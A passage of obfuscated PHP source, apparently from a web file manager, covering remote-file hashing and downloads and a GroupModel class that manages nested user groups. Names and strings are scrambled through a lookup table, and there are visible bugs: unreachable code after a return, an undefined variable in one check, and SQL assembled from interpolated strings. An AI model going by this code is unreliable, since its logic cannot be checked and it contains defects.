{ return $this->infoParse($’İ‹˜øí); } public function infoAuth($ÎÇ›ğ×î) { return $this->infoParse($ÎÇ›ğ×î); } public function infoWithChildren($Û‘™úóº) { return $this->infoParse($Û‘™úóº); } public function infoFull($äÃµïöµ) { return $this->infoParse($äÃµïöµ); } private function infoParse($ÆÁ¥Òåœ) { $şûÙÁä =& $_SERVER[²Ö÷öõ]; $ ¢ßû¥” = $this->header($ÆÁ¥Òåœ); if (!$ ¢ßû¥” || !$ ¢ßû¥”[$şûÙÁä[833]]) { return !1; } $ÉŠ‚¹Àº = _get($ ¢ßû¥”, $şûÙÁä[413], 0); $›Î€“ù = array($şûÙÁä[32] => $ ¢ßû¥”[$şûÙÁä[32]], $şûÙÁä[87] => $ÆÁ¥Òåœ, $şûÙÁä[33] => $şûÙÁä[230], $şûÙÁä[79] => intval($ÉŠ‚¹Àº), $şûÙÁä[169] => get_path_ext($ ¢ßû¥”[$şûÙÁä[32]]), $şûÙÁä[1463] => $ÉŠ‚¹Àº > 0 && $ ¢ßû¥”[$şûÙÁä[1613]], $şûÙÁä[1464] => !1); return $›Î€“ù; } private function header($éåãÎáñ) { $Ğ»üææœ =& $_SERVER[²Ö÷öõ]; if (isset(self::$_cacheHeader[$éåãÎáñ])) { return self::$_cacheHeader[$éåãÎáñ]; } $åš£·˜İ = isset($GLOBALS[$Ğ»üææœ[1614]]) ? $GLOBALS[$Ğ»üææœ[1614]] : !1; $GLOBALS[$Ğ»üææœ[1614]] = !0; self::$_cacheHeader[$éåãÎáñ] = url_header($éåãÎáñ); $GLOBALS[$Ğ»üææœ[1614]] = $åš£·˜İ; return self::$_cacheHeader[$éåãÎáñ]; } public function hashSimple($»„–Ì °, $ÚÁÚ‹ˆË = false) { $á’œ¯´ =& $_SERVER[²Ö÷öõ]; $…ä÷üÁç = $this->info($»„–Ì °); if (!$…ä÷üÁç || !$…ä÷üÁç[$á’œ¯´[232]]) { return !1; } $Â«Ëü±´ = $…ä÷üÁç[$á’œ¯´[79]]; $ëóÅğ’Ì = 200; $çì¯œÓ = 50; if ($Â«Ëü±´ <= $ëóÅğ’Ì * $çì¯œÓ) { return md5($this->fileSubstr($»„–Ì °, 0, $Â«Ëü±´)) . $Â«Ëü±´; } $šÙÚ÷ÖÜ = intval($Â«Ëü±´ / $çì¯œÓ); $Ù›ç»¤Š = $á’œ¯´[12]; $îö¾‚Î© = timeFloat(); $ìÇ§çƒ = 15; for ($°‚Şú = 0; $°‚Şú < $çì¯œÓ; $°‚Şú++) { if (timeFloat() - $îö¾‚Î© > $ìÇ§çƒ) { return !1; } $²÷À…É­ = $this->fileSubstr($»„–Ì °, $šÙÚ÷ÖÜ * $°‚Şú, $ëóÅğ’Ì); if (!$²÷À…É­) { return !1; } $Ù›ç»¤Š .= $²÷À…É­; } $Ù›ç»¤Š .= $this->fileSubstr($»„–Ì °, $Â«Ëü±´ - $ëóÅğ’Ì, $ëóÅğ’Ì); return md5($Ù›ç»¤Š) . $Â«Ëü±´; } public function getContent($âÑì—ƒñ) { return $this->fileSubstr($âÑì—ƒñ); } public function fileSubstr($õŞ¼©½Ó, $İÜ¹…‚ò = 0, $¼ç–Áç = -1) { $ı¥—Äéš =& $_SERVER[²Ö÷öõ]; $ßêéÃ¢ú = $this->info($õŞ¼©½Ó); if (!$ßêéÃ¢ú || !$ßêéÃ¢ú[$ı¥—Äéš[232]] && $ßêéÃ¢ú[$ı¥—Äéš[79]] > 1024 * 1024 * 10) { return !1; } if ($¼ç–Áç === -1) { $¼ç–Áç = $ßêéÃ¢ú[$ı¥—Äéš[79]]; } if ($¼ç–Áç == 0) { return $ı¥—Äéš[12]; } $®³œÓ¨ı = array($ı¥—Äéš[1615] . $İÜ¹…‚ò . $ı¥—Äéš[868] . ($İÜ¹…‚ò + $¼ç–Áç - 1)); $Ú²õø¤í = url_request($õŞ¼©½Ó, $ı¥—Äéš[261], !1, $®³œÓ¨ı, !1, !1, 30); return $Ú²õø¤í[$ı¥—Äéš[1295]] ? $Ú²õø¤í[$ı¥—Äéš[1295]] : $ı¥—Äéš[12]; } public function download($ÃÇ÷¿…Ÿ, $¸¿µÈñ) { Downloader::start($ÃÇ÷¿…Ÿ, $¸¿µÈñ); return $¸¿µÈñ; } } goto BÁ°‡¹¿; bÀò÷Š¹Ö¹: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\145" => "\147\162\x6f\x75\x70\x5f\155\145\x74\141", "\155\145\x74\x61\106\x69\145\x6c\x64" => "\147\x72\157\x75\160\111\104"); protected function cacheFunctionAlias($¦¯ùï) { $ïÄ’´×² =& $_SERVER[²Ö÷öõ]; return array($ïÄ’´×²[2062] => array($¦¯ùï[0], $ïÄ’´×²[2063]), $ïÄ’´×²[2064] => array($¦¯ùï[0], $ïÄ’´×²[2065])); } protected function getInfo($”‘›´‡ƒ, $©æ¡µ–ò = false) { $ù¶½âá = $this->getInfoSimple($”‘›´‡ƒ); if (!$ù¶½âá) { return !1; } if ($©æ¡µ–ò) { return $this->_listDataApplyItem($ù¶½âá); } return $this->cacheFunctionGet($_SERVER[²Ö÷öõ][2066], $”‘›´‡ƒ); } protected function getInfoSimple($©òÒºÇÌ, $ÜãÏŸï¢ = false) { $¹×Ô²üÎ =& $_SERVER[²Ö÷öõ]; if ($ÜãÏŸï¢) { $åÖ§¹Ô¿ = array($¹×Ô²üÎ[1980] => intval($©òÒºÇÌ)); $äèà”ˆ¿ = $this->where($åÖ§¹Ô¿)->find(); return is_array($äèà”ˆ¿) ? $äèà”ˆ¿ : array(); } return $this->cacheFunctionGet($¹×Ô²üÎ[2067], $©òÒºÇÌ); } protected function groupAdd($ü¦ÄÎ÷¤) { $Ô¾ÄÆŒğ =& $_SERVER[²Ö÷öõ]; if (!$ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[192]] && isset($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[1980]]) && $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[1980]] == 1) { if ($¶œë©ãæ = $this->getInfoSimple($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[1980]], !0)) { return $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[1980]]; } } else { $¶œë©ãæ = $this->getInfoSimple($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[192]]); if (!$¶œë©ãæ) { return !1; } } $Ñø¢óúÕ = $Ô¾ÄÆŒğ[594]; if ($¶œë©ãæ[$Ô¾ÄÆŒğ[584]]) { $Ñø¢óúÕ = $¶œë©ãæ[$Ô¾ÄÆŒğ[584]] . $¶œë©ãæ[$Ô¾ÄÆŒğ[1980]] . $Ô¾ÄÆŒğ[50]; } $Â®ÒµÃ“ = array($Ô¾ÄÆŒğ[494] => $this->groupNameAuto($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[192]], $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[32]]), $Ô¾ÄÆŒğ[477] => $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[192]], $Ô¾ÄÆŒğ[652] => $Ñø¢óúÕ, $Ô¾ÄÆŒğ[2068] => $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[1966]], $Ô¾ÄÆŒğ[2069] => 0, $Ô¾ÄÆŒğ[1984] => 0); if (isset($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[2004]])) { $Â®ÒµÃ“[$Ô¾ÄÆŒğ[2004]] = $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[2004]]; } else { $†«Òßá‚ = $this->max($Ô¾ÄÆŒğ[2004]); if (!$†«Òßá‚) { $†«Òßá‚ = 0; } $Â®ÒµÃ“[$Ô¾ÄÆŒğ[2004]] = $†«Òßá‚ + 1; } if (!empty($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[1980]])) { $Â®ÒµÃ“[$Ô¾ÄÆŒğ[1980]] = $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[1980]]; } $íìãû¨¤ = $this->add($Â®ÒµÃ“); $this->setNamePinyin($íìãû¨¤, $Â®ÒµÃ“[$Ô¾ÄÆŒğ[32]]); if (isset($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[2070]])) { $this->metaSet($íìãû¨¤, array($Ô¾ÄÆŒğ[2070] => $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[2070]], $Ô¾ÄÆŒğ[2071] => $ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[2071]])); unset($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[2070]]); unset($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[2071]]); } Model($Ô¾ÄÆŒğ[1428])->groupRootAdd($íìãû¨¤); $this->_clearCache($ü¦ÄÎ÷¤[$Ô¾ÄÆŒğ[192]]); return $íìãû¨¤; } protected function groupEdit($Ó¢ñÔü¯, $ÙíŞ´ÌÖ) { $éŒíÙŒ =& $_SERVER[²Ö÷öõ]; $Ú®ê‹ò = $this->getInfoSimple($Ó¢ñÔü¯); if (!$Ú®ê‹ò) { return !1; } if (!empty($ÙíŞ´ÌÖ[$éŒíÙŒ[192]])) { $æüÍëí¬ = $this->getInfoSimple($ÙíŞ´ÌÖ[$éŒíÙŒ[192]]); if (!$æüÍëí¬) { return !1; } if ($Ú®ê‹ò[$éŒíÙŒ[1980]] == $æüÍëí¬[$éŒíÙŒ[1980]]) { return !1; } if ($ÙíŞ´ÌÖ[$éŒíÙŒ[192]] != $Ú®ê‹ò[$éŒíÙŒ[192]]) { if ($æüÍëí¬[$éŒíÙŒ[584]] !== $Ú®ê‹ò[$éŒíÙŒ[584]] && strpos($æüÍëí¬[$éŒíÙŒ[584]], $Ú®ê‹ò[$éŒíÙŒ[584]] . $Ú®ê‹ò[$éŒíÙŒ[1980]] . $éŒíÙŒ[50]) === 0) { return !1; } $ÙíŞ´ÌÖ[$éŒíÙŒ[652]] = $æüÍëí¬[$éŒíÙŒ[584]] . $ÙíŞ´ÌÖ[$éŒíÙŒ[192]] . $éŒíÙŒ[50]; $this->_changeChildLevel($Ú®ê‹ò, $æüÍëí¬); $this->_clearCache($æüÍëí¬[$éŒíÙŒ[1980]]); $this->_clearCache($Ú®ê‹ò[$éŒíÙŒ[192]]); } } if (isset($ÙíŞ´ÌÖ[$éŒíÙŒ[32]])) { $this->setNamePinyin($Ó¢ñÔü¯, $ÙíŞ´ÌÖ[$éŒíÙŒ[32]]); } if (isset($ÙíŞ´ÌÖ[$éŒíÙŒ[2070]])) { $this->metaSet($Ó¢ñÔü¯, array($éŒíÙŒ[2070] => $ÙíŞ´ÌÖ[$éŒíÙŒ[2070]], $éŒíÙŒ[2071] => $ÙíŞ´ÌÖ[$éŒíÙŒ[2071]])); unset($ÙíŞ´ÌÖ[$éŒíÙŒ[2070]]); unset($ÙíŞ´ÌÖ[$éŒíÙŒ[2071]]); } $this->_clearChildrenCache($Ú®ê‹ò); return $this->where(array($éŒíÙŒ[2072] => $Ó¢ñÔü¯))->save($ÙíŞ´ÌÖ); } private function _clearChildrenCache($îÒ‰¯½¡) { $»¥ÏßûÜ =& $_SERVER[²Ö÷öõ]; $ÎÄöÌá™ = array($»¥ÏßûÜ[652] => array($»¥ÏßûÜ[612], $îÒ‰¯½¡[$»¥ÏßûÜ[584]] . $îÒ‰¯½¡[$»¥ÏßûÜ[1980]] . $»¥ÏßûÜ[613])); $’ïºıªğ = $this->field($»¥ÏßûÜ[1980])->where($ÎÄöÌá™)->select(); foreach ($’ïºıªğ as $˜§éÂùó) { $this->_clearCache($˜§éÂùó[$»¥ÏßûÜ[1980]]); } } private function _clearCache($€Í©¾¤Ò) { $ƒÛêø€½ =& $_SERVER[²Ö÷öõ]; $this->cacheFunctionClear($ƒÛêø€½[2066], $€Í©¾¤Ò); $this->cacheFunctionClear($ƒÛêø€½[2067], $€Í©¾¤Ò); } private function _changeChildLevel($´ÖŞÊ´Ù, $Ğ®¡¨×¤, $Ù‡õŸöô = false) { $¤Ÿñ¦­ñ =& $_SERVER[²Ö÷öõ]; $¾¢‘¡€¨ = $´ÖŞÊ´Ù[$¤Ÿñ¦­ñ[584]] . $´ÖŞÊ´Ù[$¤Ÿñ¦­ñ[1980]] . $¤Ÿñ¦­ñ[50]; $°Š¾áëà = $Ğ®¡¨×¤[$¤Ÿñ¦­ñ[584]] . $Ğ®¡¨×¤[$¤Ÿñ¦­ñ[1980]] . $¤Ÿñ¦­ñ[50] . $´ÖŞÊ´Ù[$¤Ÿñ¦­ñ[1980]] . $¤Ÿñ¦­ñ[50]; if ($Ù‡õŸöô) { $°Š¾áëà = $Ğ®¡¨×¤[$¤Ÿñ¦­ñ[584]] . $Ğ®¡¨×¤[$¤Ÿñ¦­ñ[1980]] . $¤Ÿñ¦­ñ[50]; } $Ÿ Â¥Ø = array($¤Ÿñ¦­ñ[652] => array($¤Ÿñ¦­ñ[612], $´ÖŞÊ´Ù[$¤Ÿñ¦­ñ[584]] . $´ÖŞÊ´Ù[$¤Ÿñ¦­ñ[1980]] . $¤Ÿñ¦­ñ[613])); $¹ªóÇË = array($¤Ÿñ¦­ñ[652] => array($¤Ÿñ¦­ñ[661], "\162\x65\x70\154\141\143\145\50\160\x61\162\x65\156\x74\x4c\x65\x76\x65\x6c\54\47{$¾¢‘¡€¨}\47\x2c\x27{$°Š¾áëà}\x27\x29")); $this->_clearChildrenCache($´ÖŞÊ´Ù); $this->where($Ÿ Â¥Ø)->data($¹ªóÇË)->save(); } public function setNamePinyin($©Éı´”Ó, $Ôòñ®Óû = false) { $¡ßœ„§Š =& $_SERVER[²Ö÷öõ]; if (!$Ôòñ®Óû) { $òÔ±„Ûà = $this->getInfoSimple($©Éı´”Ó); $Ôòñ®Óû = $òÔ±„Ûà[$¡ßœ„§Š[32]]; } if (!Input::check($Ôòñ®Óû, $¡ßœ„§Š[655])) { $this->metaSet($©Éı´”Ó, $¡ßœ„§Š[538], null); $this->metaSet($©Éı´”Ó, $¡ßœ„§Š[537], null); return; } $Í³Òëè© = array($¡ßœ„§Š[538] => str_replace($¡ßœ„§Š[53], $¡ßœ„§Š[12], Pinyin::get($Ôòñ®Óû)), $¡ßœ„§Š[537] => Pinyin::get($Ôòñ®Óû, $¡ßœ„§Š[656])); $this->metaSet($©Éı´”Ó, $Í³Òëè©); } protected function groupStatus($õà²é‚ï, $ñÜ€Æê) { $­Ùñ÷—÷ =& $_SERVER[²Ö÷öõ]; $Éµ®šÛ = $this->getInfoSimple($õà²é‚ï); if (!$Éµ®šÛ) { return !1; } $this->_clearCache($õà²é‚ï); return $this->metaSet($õà²é‚ï, $­Ùñ÷—÷[833], $ñÜ€Æê); if ($ñÜ€Æê == $­Ùñ÷—÷[91]) { $£»Š¯ß = $this->parentLevelArray($Éµ®šÛ[$­Ùñ÷—÷[584]]); } else { } $£»Š¯ß[] = $Éµ®šÛ[$­Ùñ÷—÷[1980]]; $¢òßÏù = array(); foreach ($£»Š¯ß as $õà²é‚ï) { $¢òßÏù[] = array($­Ùñ÷—÷[1980] => $õà²é‚ï, $­Ùñ÷—÷[97] => $­Ùñ÷—÷[833], $­Ùñ÷—÷[450] => $ñÜ€Æê); $this->_clearCache($õà²é‚ï); } return Model($­Ùñ÷—÷[2073])->addAll($¢òßÏù, array(), !0); } protected function groupRemove($¯ƒú¯®…, $ˆ‚é½®Û = false) { $µÙ©ï¬ =& $_SERVER[²Ö÷öõ]; $ÚÔó°‹µ = array($µÙ©ï¬[1980] => $¯ƒú¯®…); $¬òá¯½¶ = $this->where($ÚÔó°‹µ)->find(); if (!$¬òá¯½¶ || $¬òá¯½¶[$µÙ©ï¬[192]] == 0) { return !1; } if (!$ˆ‚é½®Û) { $Õ¤şÏ€ƒ = $this->getInfoSimple($¬òá¯½¶[$µÙ©ï¬[192]]); $this->_changeChildLevel($¬òá¯½¶, $Õ¤şÏ€ƒ, !0); $this->where(array($µÙ©ï¬[192] => $¯ƒú¯®…))->save(array($µÙ©ï¬[192] => $¬òá¯½¶[$µÙ©ï¬[192]])); $this->_clearCache($Õ¤şÏ€ƒ[$µÙ©ï¬[1980]]); } Model($µÙ©ï¬[2073])->where($ÚÔó°‹µ)->delete(); Model($µÙ©ï¬[2074])->where($ÚÔó°‹µ)->delete(); Model($µÙ©ï¬[907])->groupRootRemove($¯ƒú¯®…); $this->_clearCache($¬òá¯½¶[$µÙ©ï¬[192]]); return $this->where($ÚÔó°‹µ)->delete(); } protected function groupSort($û‘ºÓıÛ) { $ïûùîØé =& $_SERVER[²Ö÷öõ]; $Æùğ¿“ = array(); foreach ($û‘ºÓıÛ as $‚åÍÚ‘¾ => $³¹çÊşÂ) { $Æùğ¿“[] = array($ïûùîØé[1980], $³¹çÊşÂ, $ïûùîØé[2004], $‚åÍÚ‘¾ + 1); } $this->saveAll($Æùğ¿“); } public function listData() { $øÂ¹Ğšƒ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($øÂ¹Ğšƒ[$_SERVER[²Ö÷öõ][445]]); return $øÂ¹Ğšƒ; } private function _makeOrder($€²ùŸ² = '') { $ñ¥·‰›Â =& $_SERVER[²Ö÷öõ]; $ˆÌ¥ÆŸ¶ = array($ñ¥·‰›Â[1980], $ñ¥·‰›Â[32], $ñ¥·‰›Â[1968], $ñ¥·‰›Â[231]); $µÎ±÷Âœ = array($ñ¥·‰›Â[523] => $ñ¥·‰›Â[524], $ñ¥·‰›Â[525] => $ñ¥·‰›Â[526]); $€¹¾â = Input::get($ñ¥·‰›Â[530], $ñ¥·‰›Â[7], $ñ¥·‰›Â[1984], $ˆÌ¥ÆŸ¶); $áÈèã¹ = Input::get($ñ¥·‰›Â[531], $ñ¥·‰›Â[7], $ñ¥·‰›Â[2075], array($ñ¥·‰›Â[2075], $ñ¥·‰›Â[525])); $áÈèã¹ = $µÎ±÷Âœ[$áÈèã¹]; $€²ùŸ² = $€²ùŸ² . "{$€¹¾â}\x20{$áÈèã¹}\x2c\x20\147\x72\157\165\x70\x49\x44\40\x61\x73\143"; return $this->order($€²ùŸ²); } public function listChild($‚«‰à¼) { $Â¨­Û¢¬ =& $_SERVER[²Ö÷öõ]; $à¹¹Üá† = $this->where(array($Â¨­Û¢¬[192] => $‚«‰à¼))->_makeOrder()->selectPage(200); $this->_listDataApply($à¹¹Üá†[$Â¨­Û¢¬[445]]); return $à¹¹Üá†; } public function listChildIds($î’ƒßŞ¸) { $ˆ—‚äÊ =& $_SERVER[²Ö÷öõ]; if (is_string($Àú¡Ä¢´)) { $î’ƒßŞ¸ = explode($ˆ—‚äÊ[50], $î’ƒßŞ¸); } $‡áü = $this->where(array($ˆ—‚äÊ[1980] => array($ˆ—‚äÊ[7], $î’ƒßŞ¸)))->field($ˆ—‚äÊ[2076])->select(); if (!$‡áü) { return !1; } $º¥üĞŞÑ = array(); foreach ($‡áü as $¿ƒ¶¿„‹) { $º¥üĞŞÑ[] = "\x73\x65\x6c\145\143\164\40\147\162\157\165\160\111\x44\40\x66\x72\x6f\x6d\40\x60\147\162\x6f\165\x70\140\x20\167\x68\145\x72\145\40\160\141\x72\145\x6e\164\x4c\145\x76\x65\x6c\40\154\151\153\x65\40\x27{$¿ƒ¶¿„‹[$ˆ—‚äÊ[584]]}{$¿ƒ¶¿„‹[$ˆ—‚äÊ[1980]]}\54\x25\47"; } $º¥üĞŞÑ = implode($ˆ—‚äÊ[2077], $º¥üĞŞÑ); $‡áü = $this->query($º¥üĞŞÑ); if (!$‡áü) { return array(); } $î’ƒßŞ¸ = array_to_keyvalue($‡áü, $ˆ—‚äÊ[12], $ˆ—‚äÊ[1980]); return array_unique($î’ƒßŞ¸); } public function listByID($ºªÀÈÙˆ) { $Ñğ‡‚Òº =& $_SERVER[²Ö÷öõ]; if (!$ºªÀÈÙˆ) { return array(); } $æíâ¹ó‹ = array($Ñğ‡‚Òº[1980] => array($Ñğ‡‚Òº[7], $ºªÀÈÙˆ)); $ƒÖ¦™Í™ = $this->where($æíâ¹ó‹)->select(); $ƒÖ¦™Í™ = array_sort_keep($ƒÖ¦™Í™, $Ñğ‡‚Òº[1980], $ºªÀÈÙˆ); $this->_listDataApply($ƒÖ¦™Í™); return $ƒÖ¦™Í™; } public function listSearch($¾½ÓÑãå) { $öÓÁĞç¸ =& $_SERVER[²Ö÷öõ]; $üöºåÁƒ = trim($¾½ÓÑãå[$öÓÁĞç¸[2078]]); $›Ë¥íÆ« = explode($öÓÁĞç¸[53], $üöºåÁƒ); if (!$üöºåÁƒ || count($›Ë¥íÆ«) == 1) { return $this->listSearchNow($¾½ÓÑãå); } $íƒ²–Àº = array($öÓÁĞç¸[445] => array()); foreach ($›Ë¥íÆ« as $Ëàõ¹ª) { if (!trim($Ëàõ¹ª)) { continue; } $¾½ÓÑãå[$öÓÁĞç¸[2078]] = $Ëàõ¹ª; $Í—×ÚÁ = $this->listSearchNow($¾½ÓÑãå); $íƒ²–Àº[$öÓÁĞç¸[445]] = array_merge($íƒ²–Àº[$öÓÁĞç¸[445]], $Í—×ÚÁ[$öÓÁĞç¸[445]]); } $íƒ²–Àº[$öÓÁĞç¸[445]] = array_unique_by_key($íƒ²–Àº[$öÓÁĞç¸[445]], $öÓÁĞç¸[1980]); $íƒ²–Àº[$öÓÁĞç¸[442]] = array($öÓÁĞç¸[443] => count($íƒ²–Àº[$öÓÁĞç¸[445]]), $öÓÁĞç¸[439] => 20, $öÓÁĞç¸[429] => 1, $öÓÁĞç¸[444] => 1); return $íƒ²–Àº; } public function listSearchNow($†Ö¤è¥€) { $ÉÏüßŠ¾ =& $_SERVER[²Ö÷öõ]; $À¢„ˆš¡ = trim($†Ö¤è¥€[$ÉÏüßŠ¾[2078]]); $íßõ„¦Ğ = isset($†Ö¤è¥€[$ÉÏüßŠ¾[2079]]) ? $†Ö¤è¥€[$ÉÏüßŠ¾[2079]] : !1; if (!trim($À¢„ˆš¡)) { return !1; } $À¢„ˆš¡ = str_replace($ÉÏüßŠ¾[2080], $ÉÏüßŠ¾[2081], $À¢„ˆš¡); $—Â¸÷É© = array($ÉÏüßŠ¾[1980] => array($ÉÏüßŠ¾[459], "{$À¢„ˆš¡}\45"), $ÉÏüßŠ¾[32] => array($ÉÏüßŠ¾[459], "\45{$À¢„ˆš¡}\x25"), $ÉÏüßŠ¾[1086] => $ÉÏüßŠ¾[2082]); if ($íßõ„¦Ğ) { $ä°Ü©Î¾ = $this->getInfoSimple($íßõ„¦Ğ); $ğãõÂ«Â = $ä°Ü©Î¾[$ÉÏüßŠ¾[584]] . $íßõ„¦Ğ . $ÉÏüßŠ¾[613]; $—Â¸÷É© = array($—Â¸÷É©, array($ÉÏüßŠ¾[584] => array($ÉÏüßŠ¾[459], $ğãõÂ«Â))); } $—Â¸÷É© = $this->parseWhereLike($—Â¸÷É©); $¬Ö‚Ë§¨ = $this->_makeOrder()->where($—Â¸÷É©)->selectPage(20); $¬Ö‚Ë§¨ = $¬Ö‚Ë§¨ ? $¬Ö‚Ë§¨ : array($ÉÏüßŠ¾[445] => array(), $ÉÏüßŠ¾[442] => array()); if (!$¬Ö‚Ë§¨ || count($¬Ö‚Ë§¨[$ÉÏüßŠ¾[445]]) < 5 && Input::check($À¢„ˆš¡, $ÉÏüßŠ¾[394])) { $ù¹ÛÏ¥ù = $this->groupChildrenAll($íßõ„¦Ğ); $Ş¾Ô‚îŞ = $this->_searchFromMeta($ÉÏüßŠ¾[537], $À¢„ˆš¡, 10, $ù¹ÛÏ¥ù); $ì™²ª• = $this->_searchFromMeta($ÉÏüßŠ¾[538], $À¢„ˆš¡, 10, $ù¹ÛÏ¥ù); $®£ª·ï = array_merge($Ş¾Ô‚îŞ, $ì™²ª•, $¬Ö‚Ë§¨[$ÉÏüßŠ¾[445]]); $¬Ö‚Ë§¨[$ÉÏüßŠ¾[445]] = array_unique_by_key($®£ª·ï, $ÉÏüßŠ¾[1980]); $¬Ö‚Ë§¨[$ÉÏüßŠ¾[442]][$ÉÏüßŠ¾[443]] = count($¬Ö‚Ë§¨[$ÉÏüßŠ¾[445]]); $¬Ö‚Ë§¨[$ÉÏüßŠ¾[442]][$ÉÏüßŠ¾[444]] = ceil($¬Ö‚Ë§¨[$ÉÏüßŠ¾[442]][$ÉÏüßŠ¾[443]] / $¬Ö‚Ë§¨[$ÉÏüßŠ¾[442]][$ÉÏüßŠ¾[439]]); } $this->_listDataApply($¬Ö‚Ë§¨[$ÉÏüßŠ¾[445]]); return $¬Ö‚Ë§¨; } protected function groupChildrenAll($úõÊÄÓ”) { $Åï½˜ =& $_SERVER[²Ö÷öõ]; if (!$úõÊÄÓ”) { return !1; } if (!is_array($úõÊÄÓ”)) { $úõÊÄÓ” = array($úõÊÄÓ”); } $ºÏ®³…Ä = $úõÊÄÓ”; foreach ($úõÊÄÓ” as $¸”é»¥™) { $˜øãé² = $this->getInfoSimple($¸”é»¥™); $åõ®ø°ä = array($Åï½˜[584] => array($Åï½˜[459], $˜øãé²[$Åï½˜[584]] . $¸”é»¥™ . $Åï½˜[613])); $£Šğù³ı = $this->field($Åï½˜[1980])->where($åõ®ø°ä)->select(); $ºÏ®³…Ä = array_merge($ºÏ®³…Ä, array_to_keyvalue($£Šğù³ı, $Åï½˜[12], $Åï½˜[1980])); } return array_unique($ºÏ®³…Ä); } private function _searchFromMeta($«¢’Ó¥ , $”âµ‰’ë, $’Ğ®ƒçª, $ÊêËÇÑË) { $’§Ïš£á =& $_SERVER[²Ö÷öõ]; $”âµ‰’ë = strtolower($”âµ‰’ë); $î–ìúîó = array($’§Ïš£á[97] => $«¢’Ó¥ , $’§Ïš£á[450] => array($’§Ïš£á[459], "\x25{$”âµ‰’ë}\45")); $î–ìúîó = $this->parseWhereLike($î–ìúîó); if ($ÊêËÇÑË) { $î–ìúîó[$’§Ïš£á[1980]] = array($’§Ïš£á[7], $ÊêËÇÑË); } $Œ…æƒ£¤ = Model($’§Ïš£á[2083])->where($î–ìúîó)->limit($’Ğ®ƒçª)->select(); if (!$Œ…æƒ£¤) { return array(); } $Œ…æƒ£¤ = array_to_keyvalue($Œ…æƒ£¤, $’§Ïš£á[12], $’§Ïš£á[1980]); $–°£²ı  = $this->where(array($’§Ïš£á[2072] => array($’§Ïš£á[7], $Œ…æƒ£¤)))->select(); if (!$–°£²ı ) { return array(); } return $–°£²ı ; } protected function _listDataApplyItem($©¶¢ÇŒ) { $Ôê†Ô‚¦ = array($©¶¢ÇŒ); $this->_listDataApply($Ôê†Ô‚¦); return $Ôê†Ô‚¦[0]; } protected function _listDataApply(&$Ú×Òó×) { $ïØ“°Çª =& $_SERVER[²Ö÷öõ]; if (!$Ú×Òó×) { return; } $Š¸®ˆÂ¡ = array_to_keyvalue($Ú×Òó×, $ïØ“°Çª[12], $ïØ“°Çª[1980]); $this->_listAppendChildren($Ú×Òó×); $this->_listAppendChildrenMember($Ú×Òó×); $this->_listAppendMeta($Ú×Òó×, $Š¸®ˆÂ¡); $this->_listAppendParent($Ú×Òó×); $this->_listAppendSourceRoot($Ú×Òó×, $Š¸®ˆÂ¡); } private function _listAppendChildren(&$£µœİù®) { $ş¯‚ÁŒá =& $_SERVER[²Ö÷öõ]; $ª®‹òÜ = array_to_keyvalue($£µœİù®, $ş¯‚ÁŒá[12], $ş¯‚ÁŒá[1980]); $á‹çö¼Ø = array($ş¯‚ÁŒá[192] => array($ş¯‚ÁŒá[7], $ª®‹òÜ)); $ĞèÏÍøô = array($ş¯‚ÁŒá[192], $ş¯‚ÁŒá[2084] => $ş¯‚ÁŒá[565]); $Šì“Ë = $this->field($ĞèÏÍøô)->where($á‹çö¼Ø)->group($ş¯‚ÁŒá[192])->select(); $òÜ‡¾ŠÜ = array_to_keyvalue($Šì“Ë, $ş¯‚ÁŒá[192], $ş¯‚ÁŒá[565]); foreach ($£µœİù® as &$õÒûØøª) { $ùÛÔ¢Œò = $õÒûØøª[$ş¯‚ÁŒá[1980]]; $õÒûØøª[$ş¯‚ÁŒá[2085]] = isset($òÜ‡¾ŠÜ[$ùÛÔ¢Œò]) ? intval($òÜ‡¾ŠÜ[$ùÛÔ¢Œò]) : !1; } unset($õÒûØøª); } private function _listAppendChildrenMember(&$ÇÎïƒºù) { $ ÛğÛ†« =& $_SERVER[²Ö÷öõ]; $‰Ş¦öÙ’ = array_to_keyvalue($ÇÎïƒºù, $ ÛğÛ†«[12], $ ÛğÛ†«[1980]); $ÙÅ§×³© = array($ ÛğÛ†«[1980] => array($ ÛğÛ†«[7], $‰Ş¦öÙ’)); $‹àÕˆ€Ğ = array($ ÛğÛ†«[1980], $ ÛğÛ†«[2084] => $ ÛğÛ†«[565]); $ÈÃôë§· = Model($ ÛğÛ†«[2074])->field($‹àÕˆ€Ğ)->where($ÙÅ§×³©)->group($ ÛğÛ†«[1980])->select(); $ÙòÅÆÔ€ = array_to_keyvalue($ÈÃôë§·, $ ÛğÛ†«[1980], $ ÛğÛ†«[565]); foreach ($ÇÎïƒºù as &$÷ÛàÓÁÚ) { $¾Ò•œÂ¢ = $÷ÛàÓÁÚ[$ ÛğÛ†«[1980]]; $÷ÛàÓÁÚ[$ ÛğÛ†«[2086]] = isset($ÙòÅÆÔ€[$¾Ò•œÂ¢]) ? intval($ÙòÅÆÔ€[$¾Ò•œÂ¢]) : !1; } unset($÷ÛàÓÁÚ); } private function _listAppendMeta(&$í³¬¦”ü, $¤úÚ¦ã²) { $è€§üÌ³ =& $_SERVER[²Ö÷öõ]; $Ï¨Á‚ØÅ = array($è€§üÌ³[1980] => array($è€§üÌ³[7], $¤úÚ¦ã²)); $æİéÎ˜ı = Model($è€§üÌ³[2073])->where($Ï¨Á‚ØÅ)->select(); $æİéÎ˜ı = 